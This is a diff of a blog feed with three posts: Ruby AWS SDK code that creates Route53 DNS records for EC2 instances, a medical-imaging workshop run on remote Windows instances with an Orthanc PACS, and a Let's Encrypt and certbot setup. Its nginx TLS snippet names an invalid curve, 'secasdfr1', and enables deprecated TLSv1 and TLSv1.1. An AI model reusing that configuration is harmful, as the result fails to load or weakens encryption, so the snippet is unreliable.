+    &lt;span class=&quot;ss&quot;&gt;:action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'UPSERT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;:resource_record_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;:type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;:ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;:resource_records&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_dns_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setup_route53&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;public_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public_ip_of_instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public_ip&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;changes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;change_batch: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;ss&quot;&gt;changes: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_record_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)],&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+      &lt;span class=&quot;ss&quot;&gt;hosted_zone_id: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Z1690F00F00ZSK'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;vi&quot;&gt;@route53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;change_resource_record_sets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;changes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The result of this call is the creation of a DNS record mapping &lt;code class=&quot;highlighter-rouge&quot;&gt;workshop1.idoimaging.com&lt;/code&gt; to the public IP of that particular instance, which also has the previously-configured private IP address ending in &lt;code class=&quot;highlighter-rouge&quot;&gt;.1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The above is just the minimum code to create an EC2 instance and create a DNS record pointing to it.  Further code provides error testing and recovery, checks for pre-existing EC2 instances and DNS records, and code to start and stop the instances once they are created.&lt;/p&gt;</content><author><name>Andrew Crabb</name><email>andrew@idoimaging.com</email></author><summary type="html">Using the Ruby SDK for Amazon Web Services to create any number of EC2 instances and configure their DNS</summary></entry><entry><title type="html">Teaching imaging with remote workstations</title><link href="http://localhost:4000/2017/06/07/teaching-imaging-with-remote-workstations.html" rel="alternate" type="text/html" title="Teaching imaging with remote workstations" /><published>2017-06-07T00:00:00-04:00</published><updated>2017-06-07T00:00:00-04:00</updated><id>http://localhost:4000/2017/06/07/teaching-imaging-with-remote-workstations</id><content type="html" xml:base="http://localhost:4000/2017/06/07/teaching-imaging-with-remote-workstations.html">&lt;p&gt;Using open source client and server software on a cluster of remote Windows instances to teach imaging software and communications&lt;/p&gt;
+
+&lt;p&gt;At a recent &lt;a href=&quot;http://congress.utu.fi/turkupet2017/&quot;&gt;PET imaging conference&lt;/a&gt; in Finland, I taught a three-session workshop in practical medical imaging for scientists and physicians.  The class was oriented toward research rather than clinical medicine, so we were interested in image formats besides DICOM, since a lot of research software is developed for specific uses in academic environments and uses application-specific formats.  NIFTI is the file format of choice in neuro imaging, and so this was our preferred format besides DICOM.&lt;/p&gt;
+
+&lt;p&gt;In a previous iteration of this course, I’d had the participants install the necessary software on their own laptops.  This gives more exposure to the real-life problems involved in installing software, but led to too much time being spent on technical and logistical issues.  Not everyone had full access to administrative accounts on their PCs, if they were company-supplied.  Several of the programs used were Java-based, and installing and authorising Java created some problems.&lt;/p&gt;
+
+&lt;p&gt;For this year’s workshop, I wanted the participants to be able to concentrate more on the imaging programs.  As it’s now so easy to deploy Windows machines in Amazon Web Service’s &lt;a href=&quot;https://aws.amazon.com/ec2/&quot;&gt;EC2 service&lt;/a&gt;, AWS &lt;a href=&quot;https://aws.amazon.com/ec2/instance-types/&quot;&gt;t2.small&lt;/a&gt; instances (2 GB RAM, 1 CPU) were chosen as the platform of choice.  Users log in to the instances remotely using Microsoft Remote Desktop from a Mac or PC, and with a decent connection it’s possible to work interactively on the remote Windows desktop.  The software and test data for the course are pre-installed on the workstations, and the workshop participants could if they wish install the same or equivalent software on their own computers, for a bit more of a challenge.  The OS on Amazon is Windows Server 2012, which is sufficiently similar to Windows 8 or 10 that most people find it familiar to work on.&lt;/p&gt;
+
+&lt;h1 id=&quot;software&quot;&gt;Software&lt;/h1&gt;
+
+&lt;p&gt;A master instance is created that later would be cloned by exporting the instance’s disk to an Amazon Machine Image (AMI), from which any number of instances can be launched.  On the master instance I set things up to provide a range of imaging capabilities:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Installed all the latest Windows updates.&lt;/li&gt;
+  &lt;li&gt;Turned down internet security, and installed Chrome and Firefox.&lt;/li&gt;
+  &lt;li&gt;Created a user with administrative and remote login rights.&lt;/li&gt;
+  &lt;li&gt;Installed software:
+    &lt;ul&gt;
+      &lt;li&gt;Java,  with permissions and without their spammy toolbar and other unwanted changes.&lt;/li&gt;
+      &lt;li&gt;Cygwin and Powershell shells.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/107&quot;&gt;RadiAnt&lt;/a&gt;, &lt;a href=&quot;https://idoimaging.com/programs/147&quot;&gt;Synedra&lt;/a&gt; and &lt;a href=&quot;https://idoimaging.com/programs/95&quot;&gt;Ginkgo CADx&lt;/a&gt; DICOM image viewers and PACS nodes.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/124&quot;&gt;Mango&lt;/a&gt; for viewing and inspecting headers of DICOM/NIFTI files.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/141&quot;&gt;VINCI&lt;/a&gt; for advanced image analysis.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/68&quot;&gt;dcm4che3&lt;/a&gt; and &lt;a href=&quot;https://idoimaging.com/programs/281&quot;&gt;DCMTK&lt;/a&gt; command-line DICOM tools.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/73&quot;&gt;Orthanc&lt;/a&gt; DICOM server with plugins for web viewer and DICOMWeb.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/62&quot;&gt;DICOMBrowser&lt;/a&gt; and &lt;a href=&quot;https://idoimaging.com/programs/146&quot;&gt;LONI Inspector&lt;/a&gt; for viewing and comparing image headers.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/214&quot;&gt;MRIConvert&lt;/a&gt; for DICOM conversion.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://idoimaging.com/programs/63&quot;&gt;DicomCleaner&lt;/a&gt; for DICOM anonymisation.&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://github.com/rordenlab/dcm2niix&quot;&gt;dcm2niix&lt;/a&gt; for DICOM to NIFTI conversion through the GUI and command line.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set up the Windows path for the command-line programs.&lt;/li&gt;
+  &lt;li&gt;Opened ports for DICOM communication (8042 and 4242 for Orthanc, 11112 for RadiAnt)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Several of the programs perform the same or similar tasks: three DICOM viewers, two command-line DICOM toolkits, several DICOM header viewers.  This helps to demonstrate that the same functionality is available in different programs.&lt;/p&gt;
+
+&lt;p&gt;Overall, the programs worked well togehter.  The workshop participants downloaded &lt;a href=&quot;https://wiki.idoimaging.com/index.php?title=Sample_Data&quot;&gt;sample data files&lt;/a&gt; from I Do Imaging and we used the inspectors to examine the headers of DICOM and NIFTI files.  After converting from DICOM to NIFTI by several methods, we looked at how the different conversion programs created different header values, and we used VINCI to examine the small differences in the voxel values resulting from the conversions.  We also performed anonymisation with one-click and configurable processes and looked at what was altered in the image files.&lt;/p&gt;
+
+&lt;p&gt;The participants connected to public PACS servers hosted at I Do Imaging, also those at &lt;a href=&quot;http://www.pixelmed.com/publicdicomserver.html&quot;&gt;PixelMed&lt;/a&gt; and &lt;a href=&quot;http://dicomserver.co.uk/&quot;&gt;Medical Connections&lt;/a&gt;.  Since the I Do Imaging public PACS was re-implemented using &lt;a href=&quot;https://github.com/dcm4che/dcm4chee-arc-light/wiki&quot;&gt;dcm4chee Archive 5&lt;/a&gt;, where C-GET has been deprecated, it currently can be used only for searching, not downloading, data.  C-MOVE requires prior knowledge of the requesting workstation, which of course is not a possibility for a public PACS.&lt;/p&gt;
+
+&lt;h1 id=&quot;introducing-the-command-line&quot;&gt;Introducing the Command Line&lt;/h1&gt;
+
+&lt;p&gt;The theme of the workshop is increasing efficiency through better procedures.  In part this is achieved through choosing the right software, and I aim to encourage the participants to make use of the vast selection of free medical imaging software that’s available.  Another goal is to move away from manual processes, and even if there’s not time to teach automation processes, to at least demonstrate how with a little knowledge it’s possible to get the computer to do the routine work for you, and do it much faster and more accurately than doing it manually.&lt;/p&gt;
+
+&lt;p&gt;The automation workflow I teach has three levels:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Prototype the end-to-end processing using GUI tools, and test the result until satisfied.&lt;/li&gt;
+  &lt;li&gt;Replicate this workflow using command-line tools, and test that you get the same results.&lt;/li&gt;
+  &lt;li&gt;Develop a script or other automation process to call the command-line programs with the correct inputs.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We used several programs to demonstrate the speed and flexibility of command line programs as compared to their GUI counterparts.  Both the &lt;a href=&quot;https://idoimaging.com/programs/281&quot;&gt;dcmtk&lt;/a&gt; and &lt;a href=&quot;https://idoimaging.com/programs/68&quot;&gt;dcm4che&lt;/a&gt; toolkits have a program named &lt;code class=&quot;highlighter-rouge&quot;&gt;dcmdump&lt;/code&gt; to dump a DICOM header.  Lots of GUI programs can do this, of course, but running from the command line results in text output which can be processed using the full power of the Linux or Windows shell.  You could redirect the output of the dump command to a file for later analysis:&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dcmdump img_000.dcm &amp;gt; img_000.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Or you can use a shell loop to extract one field from a number of files.  Let’s say you have a directory containing images from multiple series in a study.  You can quickly extract the series times using the shell constructs &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sort&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;f &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;dcm ; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;dcmdump &lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt; | grep SeriesTime; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | sort -u
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0008,0031&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; TM &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;002858.419]                             &lt;span class=&quot;c&quot;&gt;#  10, 1 SeriesTime&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0008,0031&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; TM &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;004553.476]                             &lt;span class=&quot;c&quot;&gt;#  10, 1 SeriesTime&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;You could achieve something similar with a GUI program such as LONI Inspector, but performing it at the command line with text tools is faster, more flexible, and can be automated, with the results from one program fed in to another to form a processing pipeline.&lt;/p&gt;
+
+&lt;p&gt;Learning to use the shell is a long process that can’t be taught in one class, but it’s helpful to expose people to command-line processing at an eary stage to demonstrate what’s possible.  It’s particularly instructive to first run a process in a GUI program to understand the procedure, then to re-implement the process on the command line.&lt;/p&gt;
+
+&lt;h1 id=&quot;running-a-local-dicom-pacs&quot;&gt;Running a local DICOM PACS&lt;/h1&gt;
+
+&lt;p&gt;To provide a working PACS server that could be used as a data source, I needed to configure a list of DICOM nodes, one per workstation, with known IP numbers and AE titles.  This allows eash node to retrieve data using the C-MOVE request, which requires that the remote nodes be pre-configured into the server.&lt;/p&gt;
+
+&lt;p&gt;This was achieved by having each workstation having a network interface on a private subnet, with a configureable IP address.  The convention used was to have the AE title correspond to the private IP of each workstation: the private subnet was &lt;code class=&quot;highlighter-rouge&quot;&gt;172.31.15&lt;/code&gt; and the nodes were configured starting with private IP &lt;code class=&quot;highlighter-rouge&quot;&gt;172.31.15.1&lt;/code&gt;, AE Title &lt;code class=&quot;highlighter-rouge&quot;&gt;WORKSHOP01&lt;/code&gt;, on up to 20.&lt;/p&gt;
+
+&lt;p&gt;Separately from the private IP, each workstation needed to be accessed from the Internet.  This was accomplished by setting up a DNS record to point to the dynamically allocated public IP address of each workstation.  Each person would then use the fully qualified DNS name to connect to the workstation using Remote Desktop.  How this was all set up is covered in the &lt;a href=&quot;/2017/06/08/creating-aws-instances-and-dns-records-using-the-ruby-sdk.html&quot;&gt;blog post on creating AWS instances&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;orthanc-as-a-pacs-server&quot;&gt;Orthanc as a PACS server&lt;/h1&gt;
+
+&lt;p&gt;Because we could control the private IP addresses of the workstations, the configuration of the server used (Orthanc) was quite simple.  Orthanc is configured using a plain-text JSON file, and the server parameters are configured in a section of this file.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
+ * Configuration of the DICOM server
+ **/&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Enable the DICOM server.&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;DicomServerEnabled&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// The DICOM Application Entity Title&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;DicomAet&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ORTHANC&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Check whether the called AET corresponds during a DICOM request&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;DicomCheckCalledAet&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// The DICOM port&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;DicomPort&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The remote nodes (each workshop participant’s workstation), which would be querying and receiving from the server, are configured in the ‘Network topology’ section of that file.  Each node’s entry has an identifying name, and an array of the AE Title, address, and port number of the node.  Our AE Titles and (private) IP number addresses are sequentially numbered starting at 1, and we are using port 11112 on each node.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
+ * Network topology
+ **/&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// The list of the known DICOM modalities&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;DicomModalities&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;workstation01&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WORKSTATION01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.31.15.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;11112&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;workstation02&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WORKSTATION02&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.31.15.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;11112&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// And so on...&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;workstation20&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WORKSTATION20&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.31.15.20&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11112&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now each node is configured into the Orthanc server, and can use its AE Title as a C-MOVE destination.  We used RadiAnt as a PACS client on each node and were able to query and retrieve from the Orthanc server.  As an advanced exercise, we replicated the process on the command line using several of the ‘'’dcm4che3’’’ tools.&lt;/p&gt;
+
+&lt;p&gt;In addition to the standard DICOM communications interface, Orthanc has a REST interface that uses standard HTTP communication protocols.  We used standard network tools (Postman for GUI, curl for command line) to query the server through its HTTP port.&lt;/p&gt;
+
+&lt;p&gt;Orthanc turned out to be particularly suitable for this class.  It’s fast and easy to install and configure, needing no external database, and multiple PACS clients could easily be configured in the configuration JSON file using an editor.   After gaining experience in querying and retrieving from the master Orthanc server, the class participants can then set up their own server and send images to each other.  This is a great introduction to how easy it is to set up your own local image server.&lt;/p&gt;</content><author><name>Andrew Crabb</name><email>andrew@idoimaging.com</email></author><summary type="html">Using open source client and server software on a cluster of remote Windows instances to teach imaging software and communications</summary></entry><entry><title type="html">http considered harmful</title><link href="http://localhost:4000/2017/02/21/http-considered-harmful.html" rel="alternate" type="text/html" title="http considered harmful" /><published>2017-02-21T00:00:00-05:00</published><updated>2017-02-21T00:00:00-05:00</updated><id>http://localhost:4000/2017/02/21/http-considered-harmful</id><content type="html" xml:base="http://localhost:4000/2017/02/21/http-considered-harmful.html">&lt;p&gt;How we got the green padlock of approval with the help of Let’s Encrypt.&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-488by56-f9afcb.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-488by56-f9afcb.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-488by56-f9afcb.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-450by52-f9afcb.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-98by56-f9afcb.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_idoimaging_com-98by56-f9afcb.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/secure_idoimaging_com-98by56-f9afcb.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;Encrypted transport is rapidly becoming a requirement on the web, to the extent that this year Chrome will flag unencrypted (http://) sites as ‘hazardous’.  Re-implemting the site seemed a good time to make this change.&lt;/p&gt;
+
+&lt;p&gt;Until recently, secured/encrypted communications required buying a certificate from one of a number of certificate authorities (CA’s) that were pretty expensive.  There are various levels of security; the green padlock is the lowest level, and if you want to have your company name shown in the address bar there’s a lengthy process to go through to demonstrate that you physically own the company.&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-592by56-0cba51.jpg&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-592by56-0cba51.jpg&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-592by56-0cba51.jpg&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-450by43-0cba51.jpg&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-98by56-0cba51.jpg&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/secure_github-98by56-0cba51.jpg&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/secure_github-98by56-0cba51.jpg&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;h2 id=&quot;getting-all-https-y-with-lets-encrypt&quot;&gt;Getting all https-y with Let’s Encrypt&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s Encrypt&lt;/a&gt; is a free provider of HTTPS (SSL/TLS) certificates.  It’s funded by industry; sponsors include Mozilla, EFF, Cisco, Chrome, and many others.  They also accept donations.  Let’s Encrypt allows you to implement basic HTTPS on your website for free, and it’s not too hard.&lt;/p&gt;
+
+&lt;p&gt;I started by downloading &lt;a href=&quot;https://certbot.eff.org/&quot;&gt;Certbot&lt;/a&gt;, a program to automate the generation and installation of the certificates issued by Let’s Encrypt, from the EFF.  My particular variant of Linux (Amazon Linux AMI) did not have a fully-automatic installer but even then the process isn’t too hard.  Basically the program communicates with Let’s Encrypt to generate a text key, which is then uploaded into your public web server.  Let’s Encrypt then visits your site, and upon finding the key, certifies you as the owner of that site.  The trust is based upon contol of the web server.&lt;/p&gt;
+
+&lt;p&gt;There’s just one command-line program to run, and here it is, edited for the interesting bits.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo ./certbot-auto certonly
+Please enter in your domain name(s): idoimaging.com
+Obtaining a new certificate
+Performing the following challenges:
+http-01 challenge for idoimaging.com
+Input the webroot for idoimaging.com: /var/www/idoimaging/current/public
+Waiting for verification...
+Cleaning up challenges
+Generating key (2048 bits): /etc/letsencrypt/keys/0001_key-certbot.pem
+Creating CSR: /etc/letsencrypt/csr/0001_csr-certbot.pem
+IMPORTANT NOTES:
+ - Congratulations! Your certificate and chain have been saved at
+   /etc/letsencrypt/live/idoimaging.com/fullchain.pem.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The program generates the keys, then asks where your public webroot is.  In this case it’s a rails site so it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/idoimaging/current/public&lt;/code&gt;.  This is where the key is copied to temporarily, then letsencrypt.org is contacted to query my site, which happens very quickly.  The resulting TLS certificate and key are stored on my system, and I configure my web server (nginx) to pick up the certificates.  There are lines in there to specify which protocols are supported:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
+ssl_prefer_server_ciphers on;
+ssl_ciphers &quot;EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH&quot;;
+ssl_ecdh_curve secasdfr1;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;and lines to read in the certificates themselves:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssl_certificate /etc/letsencrypt/live/idoimaging.com/fullchain.pem;
